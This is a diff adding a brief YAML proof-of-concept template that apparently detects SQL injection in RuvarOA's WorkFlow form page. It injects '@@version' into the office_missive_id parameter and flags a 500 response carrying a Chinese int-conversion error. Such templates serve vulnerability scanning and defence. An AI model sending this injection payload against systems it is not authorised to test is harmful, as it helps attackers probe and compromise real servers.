@@ -1,0 +1,15 @@
+name: poc-yaml-RuvarOA-sql
+transport: http
+  
+rules:
+  r0:
+    request:
+      method: GET
+      path: /WorkFlow/wf_work_form_save.aspx?office_missive_id=@@version
+    expression: response.status == 500 && response.body.bcontains(b'转换成数据类型 int 时失败')
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139249159
